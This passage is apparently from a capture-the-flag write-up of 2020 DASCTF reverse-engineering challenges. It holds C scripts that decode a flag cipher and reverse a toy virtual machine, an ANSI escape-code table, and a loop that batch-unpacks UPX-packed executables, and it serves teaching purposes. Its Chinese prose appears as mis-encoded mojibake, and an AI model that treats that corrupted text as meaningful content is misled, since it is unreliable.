class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_1209</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(a &gt;= <span class="number">97</span> &amp;&amp; a &lt;= <span class="number">122</span>)</span><br><span class="line"><span class="keyword">return</span> a<span class="number">-97</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a &gt;= <span class="number">65</span> &amp;&amp; a &lt;= <span class="number">90</span>)</span><br><span class="line"><span class="keyword">return</span> (a<span class="number">-65</span>)^<span class="number">0xFFFFFF80</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> a; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, v4 = <span class="number">0</span>, j = <span class="number">0</span>, v2 = <span class="number">0</span>, v5 = <span class="number">0</span>, v1 = <span class="number">0</span>; </span><br><span class="line"><span class="keyword">char</span> a[<span class="number">26</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> b[] = <span class="string">"TaQini"</span>;</span><br><span class="line"><span class="keyword">char</span> c[] = <span class="string">"FQD&#123;GfjuJ5UbLrWjZjpvErXkiAZzlvO0xTa!cwnLLAsy3B0iEvEy&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">a[i] = <span class="number">122</span>-i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(c); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((c[i] &gt;= <span class="number">97</span> &amp;&amp; c[i] &lt;= <span class="number">122</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">97</span>; j &lt;= <span class="number">122</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">v4 = sub_1209(j);</span><br><span class="line">v2 = sub_1209(b[v5 &amp; <span class="number">5</span>]);</span><br><span class="line"><span class="keyword">if</span>(c[i] == a[((v2&amp;<span class="number">0x7F</span>) + v4)%<span class="number">26</span>])</span><br><span class="line">&#123;</span><br><span class="line">c[i] = j;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">v5++; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(c[i] &gt;= <span class="number">65</span> &amp;&amp; c[i] &lt;= <span class="number">90</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">65</span>; j &lt;= <span class="number">90</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">v4 = sub_1209(j);</span><br><span class="line">v1 = sub_1209(b[v5 &amp; <span class="number">5</span>]);</span><br><span class="line"><span class="keyword">if</span>(c[i] == a[(v4+(v1 &amp; <span class="number">0x7F</span>) + <span class="number">128</span>)%<span class="number">26</span>] - <span class="number">32</span>)</span><br><span class="line">&#123;</span><br><span class="line">c[i] = j;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">v5++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(c);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>æœ€åè¡¥å……ä¸€ä¸‹å¯¹æ”¹å˜è¾“å‡ºå­—ç¬¦ä¸²çš„çŸ¥è¯†ã€‚</p><table><thead><tr><th>\033[0m</th><th>å…³é—­æ‰€æœ‰å±æ€§</th></tr></thead><tbody><tr><td><strong>\033[01m</strong></td><td><strong>è®¾ç½®é«˜äº®åº¦</strong></td></tr><tr><td><strong>\033[04m</strong></td><td><strong>ä¸‹åˆ’çº¿</strong></td></tr><tr><td><strong>\033[05m</strong></td><td><strong>é—ªçƒ</strong></td></tr><tr><td><strong>\033[07m</strong></td><td><strong>åæ˜¾</strong></td></tr><tr><td><strong>\033[08m</strong></td><td><strong>æ¶ˆéš</strong></td></tr><tr><td><strong>\033[30m â€“ \033[37m</strong></td><td><strong>è®¾ç½®å‰æ™¯è‰²</strong></td></tr><tr><td><strong>\033[40m â€“ \033[47m</strong></td><td><strong>è®¾ç½®èƒŒæ™¯è‰²</strong></td></tr><tr><td><strong>\033[nA</strong></td><td><strong>å…‰æ ‡ä¸Šç§»nè¡Œ</strong></td></tr><tr><td><strong>\033[nB</strong></td><td><strong>å…‰æ ‡ä¸‹ç§»nè¡Œ</strong></td></tr><tr><td><strong>\033[nC</strong></td><td><strong>å…‰æ ‡å³ç§»nè¡Œ</strong></td></tr><tr><td><strong>\033[nD</strong></td><td><strong>å…‰æ ‡å·¦ç§»n</strong></td></tr><tr><td><strong>\033[y;xH</strong></td><td><strong>è®¾ç½®å…‰æ ‡ä½ç½®</strong></td></tr><tr><td><strong>\033[2J</strong></td><td><strong>æ¸…å±</strong></td></tr><tr><td><strong>\033[K</strong></td><td><strong>æ¸…é™¤ä»å…‰æ ‡åˆ°è¡Œå°¾çš„å†…å®¹</strong></td></tr><tr><td><strong>\033[s</strong></td><td><strong>ä¿å­˜å…‰æ ‡ä½ç½®</strong></td></tr><tr><td><strong>\033[u</strong></td><td><strong>æ¢å¤å…‰æ ‡ä½ç½®</strong></td></tr><tr><td><strong>\033[?25l</strong></td><td><strong>éšè—å…‰æ ‡</strong></td></tr><tr><td><strong>\033[?25h</strong></td><td><strong>æ˜¾ç¤ºå…‰æ ‡</strong></td></tr></tbody></table></li><li><p><strong>æ€»ç»“: é¢˜æœ¬æ¥å¾ˆç®€å•, ä¸»è¦å‡ æ¬¡è¢«å¸¦å…¥å‘. ä¹Ÿæ˜¯æ²¡ç»éªŒã€‚</strong></p></li></ul><hr><h3 id="MiscVm"><a href="#MiscVm" class="headerlink" title="MiscVm"></a>MiscVm</h3><ul><li><p>ä¸‹è½½ä¸‹æ¥, 64ä½çš„æ— å£³elfæ–‡ä»¶å’Œä¸€ä¸ªæ“ä½œç æ–‡ä»¶.  æ“ä½œç å…¶å®é¢˜ä¸­ä¹Ÿæœ‰, è¿™é‡Œå•ç‹¬ç»™äº†æ–¹ä¾¿å¾ˆå¤š.</p></li><li><p>è½½å…¥ida. C++é€†å‘ç±»çš„, ä½†è¿˜å¥½éƒ½æ˜¯å¾ˆåŸºæœ¬çš„è¯­æ³•. <img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524075414831.png" alt="image-20200524075414831"></p></li><li><p>åˆ†åˆ«è¿›å»ä¸‰ä¸ªåŠ å¯†å‡½æ•°. ç¬¬ä¸€ä¸ª: <strong>sub_19E2((int64)&amp;v13</strong>, (__int64)&amp;v14);å¾ˆç®€å•,   å°±æ˜¯ 2ä¸ªæ•°çš„å€¼äº¤æ¢.</p><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524075631032.png" alt="image-20200524075631032"></p></li><li><p>ç¬¬äºŒä¸ª: <strong>sub_1551((int64)&amp;v14, (int64)&amp;v13);</strong>,  å°±æ˜¯æŒ‰ç…§ç»™å®šé¡ºåºè¿›è¡Œç®€å•çš„å€¼äº¤æ¢.</p><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524075954652.png" alt="image-20200524075954652"></p></li><li><p>ç¬¬ä¸‰ä¸ª: <strong>v8 = (unsigned int)sub_EEC(&amp;v14, &amp;v15, 0LL) != 0</strong>,   è¿™ä¸ªç›¸å¯¹äºè¦éº»çƒ¦ä¸€äº›, ä½†åˆ†æä¸€ä¸‹, æ€è·¯ç†æ¸…, é€†å›å»å°±å¥½äº†.</p><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524083055817.png" alt="image-20200524083055817"></p></li><li><p>exp: Cè¯­è¨€å†™çš„, æ¯”è¾ƒå†—é•¿. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">decode_4</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, temp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">j = i;</span><br><span class="line"></span><br><span class="line">j ^= <span class="number">10</span>;</span><br><span class="line">temp = (<span class="number">16</span>*j &gt;&gt; <span class="number">31</span>)&gt;&gt;<span class="number">28</span>;</span><br><span class="line"><span class="keyword">if</span>(a == j + (((temp + <span class="number">16</span>*(*(<span class="keyword">char</span> *)&amp;j))&amp;<span class="number">0xF</span>)-temp))</span><br><span class="line"><span class="keyword">break</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[<span class="number">152</span>];</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">37</span>];</span><br><span class="line">&#125;A = &#123;</span><br><span class="line">   <span class="number">66</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">74</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">68</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">123</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">51</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">112</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">70</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">212</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">60</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">16</span>,   <span class="number">6</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">79</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">200</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">108</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">32</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">30</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">144</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">111</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">48</span>,   <span class="number">6</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">70</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">144</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">59</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">16</span>,   <span class="number">6</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">29</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">196</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">62</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">96</span>,   <span class="number">6</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">75</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">208</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">108</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">16</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">70</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">136</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">51</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">112</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">76</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">204</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">125</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">36</span>, temp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> d[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, e[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> a1[<span class="number">100</span>] = &#123;<span class="number">3</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">36</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">36</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">9</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> b[<span class="number">100</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">19</span>,<span class="number">31</span>,<span class="number">25</span>,<span class="number">14</span>,<span class="number">23</span>,<span class="number">33</span>,<span class="number">13</span>,<span class="number">9</span>,<span class="number">24</span>,<span class="number">6</span>,<span class="number">26</span>,<span class="number">34</span>,<span class="number">17</span>,<span class="number">10</span>,<span class="number">8</span>,<span class="number">29</span>,<span class="number">12</span>,<span class="number">15</span>,<span class="number">22</span>,<span class="number">11</span>,<span class="number">18</span>,<span class="number">16</span>,<span class="number">32</span>,<span class="number">28</span>,<span class="number">21</span>,<span class="number">36</span>,<span class="number">20</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">27</span>,<span class="number">30</span>,<span class="number">35</span>,<span class="number">37</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> c[<span class="number">100</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">31</span>,<span class="number">29</span>,<span class="number">7</span>,<span class="number">35</span>,<span class="number">14</span>,<span class="number">21</span>,<span class="number">9</span>,<span class="number">16</span>,<span class="number">27</span>,<span class="number">18</span>,<span class="number">25</span>,<span class="number">10</span>,<span class="number">20</span>,<span class="number">15</span>,<span class="number">17</span>,<span class="number">22</span>,<span class="number">28</span>,<span class="number">26</span>,<span class="number">36</span>,<span class="number">33</span>,<span class="number">32</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">23</span>,<span class="number">34</span>,<span class="number">13</span>,<span class="number">30</span>,<span class="number">24</span>,<span class="number">11</span>,<span class="number">19</span>,<span class="number">6</span>,<span class="number">37</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(i &gt;= <span class="number">-87</span>)</span><br><span class="line"><span class="keyword">switch</span>(a1[<span class="number">87</span>+i])</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">--j;</span><br><span class="line">--i;</span><br><span class="line">A.a[j] = (A.a[j] / <span class="number">16</span>)*<span class="number">2</span>;</span><br><span class="line">A.a[j] = A.a[j];</span><br><span class="line">A.a[j] /= <span class="number">2</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">A.a[j] -= <span class="number">128</span>;</span><br><span class="line">A.a[j] = A.a[j]*j;</span><br><span class="line">--i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">A.a[++j] /= <span class="number">10</span>;</span><br><span class="line">--i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">--j;</span><br><span class="line">--i;</span><br><span class="line">A.a[j] = decode_4(A.a[j]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">A.a[j] = A.a[j];</span><br><span class="line">--i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">A.a[j--] *= <span class="number">10</span>;</span><br><span class="line">--i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">A.a[j] -= <span class="number">128</span>;</span><br><span class="line">A.a[j] = ~A.a[j];</span><br><span class="line">--i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">--i;</span><br><span class="line">--j;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">A.a[j] /= <span class="number">4</span>;</span><br><span class="line">--i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">--i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">37</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">d[c[i]<span class="number">-1</span>] = A.a[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">37</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">e[b[i]<span class="number">-1</span>] = d[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">4</span>; i &lt;= <span class="number">19</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">temp = e[i];</span><br><span class="line">e[i] = e[i+<span class="number">16</span>];</span><br><span class="line">e[i+<span class="number">16</span>] = temp;</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">37</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, e[i]); </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524083340342.png" alt="image-20200524083340342"></p></li></ul><hr><h3 id="BScript"><a href="#BScript" class="headerlink" title="BScript"></a>BScript</h3><ul><li><p>æ„Ÿè§‰æœ‰ç‚¹æ„æ€.  ä¸»è¦å°±æ˜¯è€ƒå¯¹æ–‡ä»¶å†…å®¹çš„æå–, è¿˜æœ‰å°±æ˜¯æ‰¾è§„å¾‹!!!</p></li><li><p>ä¸‹è½½ä¸‹æ¥803ä¸ªexeæ–‡ä»¶.  éšä¾¿æ‰“å¼€ä¸€ä¸ªçœ‹è§ç®€å•çš„è¾“å…¥å¯¹æ¯”, å†æ‰“å¼€ä¸€ä¸ªè¿˜æ˜¯åŒæ ·çš„.ä½†æ²¡æœ‰å‘ç°ä¸è§£é¢˜ç›¸å…³çš„ä¸œè¥¿.</p></li><li><p>ä¹Ÿæ˜¯åé¢æƒ³ç€å†å»çœ‹çœ‹è¿™ä¸ªé¢˜æ‰å‘ç° æ¯ä¸ªexeæ–‡ä»¶è®©æˆ‘ä»¬è¾“å…¥çš„éƒ½æ˜¯ä¸€ä¸ªPEæ–‡ä»¶çš„ä¸€éƒ¨åˆ†, é‚£ ç†Ÿæ‚‰çš„ MZ(4D5A).<img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524100310951.png" alt="image-20200524100310951"></p></li><li><p>æ¥ä¸‹æ¥å°±æ˜¯å»æ–‡ä»¶å†…å®¹äº†. ä½†æ˜¯æ¯ä¸ªç¨‹åºéƒ½æ˜¯åŠ äº†upxå£³çš„ã€‚</p></li><li><p>ç„¶åç”¨Cè¯­è¨€å†™äº†è„±å£³ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">83</span>; i &lt; <span class="number">804</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(a, <span class="string">"upx -d %d.exe"</span>, i);</span><br><span class="line">system(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524102949962.png" alt="image-20200524102949962"></p></li><li><p>ä¸‹é¢æå–æ¯ä¸ªç¨‹åºçš„ PEæ–‡ä»¶é‚£éƒ¨åˆ†çš„å†…å®¹. å¼„å®Œ, ä¿å­˜ä¸ºexeæ–‡ä»¶å, æ‰“ä¸å¼€â€¦idaéƒ½ä¸è¡Œ, çœ‹çœ‹äº†PEæ–‡ä»¶å†…å®¹å‘ç°åŒºæ®µéƒ½æ²¡æœ‰ã€‚ã€‚</p></li><li><p>é‚£å°±æå–çš„å†…å®¹æœ‰é—®é¢˜, 